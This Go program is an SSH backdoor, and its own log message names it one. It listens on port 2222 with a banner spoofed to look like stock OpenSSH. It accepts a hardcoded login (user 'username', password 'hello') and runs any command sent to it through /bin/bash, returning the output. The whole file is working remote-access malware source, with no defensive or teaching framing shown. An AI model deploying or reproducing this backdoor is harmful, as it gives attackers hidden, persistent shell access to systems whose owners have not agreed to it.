package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os/exec"

	"github.com/gliderlabs/ssh"
	"github.com/integrii/flaggy"
	gossh "golang.org/x/crypto/ssh"
)

func main() {
	var (
		lport       uint   = 2222
		lhost       net.IP = net.ParseIP("0.0.0.0")
		keyPath     string = "id_rsa"
		fingerprint string = "OpenSSH_8.2p1 Debian-4"
	)

	flaggy.UInt(&lport, "p", "port", "Local port to listen for SSH on")
	flaggy.IP(&lhost, "i", "interface", "IP address for the interface to listen on")
	flaggy.String(&keyPath, "k", "key", "Path to private key for SSH server")
	flaggy.String(&fingerprint, "f", "fingerprint", "SSH Fingerprint, excluding the SSH-2.0- prefix")
	flaggy.Parse()

	log.SetPrefix("SSH - ")
	privKeyBytes, err := ioutil.ReadFile(keyPath)
	if err != nil {
		log.Panicln("Error reading privkey:\t", err.Error())
	}
	privateKey, err := gossh.ParsePrivateKey(privKeyBytes)
	if err != nil {
		log.Panicln("Error parsing privkey:\t", err.Error())
	}
	server := &ssh.Server{
		Addr:            fmt.Sprintf("%s:%v", lhost.String(), lport),
		Handler:         sshHandler,
		Version:         fingerprint,
		PasswordHandler: passwordHandler,
	}
	server.AddHostKey(privateKey)
	log.Println("Started SSH backdoor on", server.Addr)
	log.Fatal(server.ListenAndServe())
}

func sshHandler(s ssh.Session) {
	command := s.RawCommand()
	s.Write([]byte(runCommand(command)))
}

func runCommand(cmd string) string {
	result := exec.Command("/bin/bash", "-c", cmd)
	response, _ := result.CombinedOutput()
	return string(response)
}
func verifyPass(password string) bool{
	return password == "hello"
}

func passwordHandler(context ssh.Context, password string) bool {
	if context.User() == "username" {
		return verifyPass(password)
	}
	verifyPass(password)
	return false
}
